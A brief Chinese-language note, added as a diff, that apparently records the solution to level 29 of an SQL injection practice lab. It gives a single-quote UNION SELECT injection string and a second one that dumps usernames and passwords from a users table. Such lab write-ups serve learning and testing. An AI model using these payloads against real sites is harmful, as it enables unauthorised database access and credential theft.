@@ -1,0 +1,11 @@
+第29关
+
+这关说有防火墙，但可以正常单引号注入
+?id=-1' union select 1,2,3 --+
+
+爆出信息
+?id=-1' union select 1,2,group_concat(username,password) from users --+
+
+
+
+闯关成功！！！
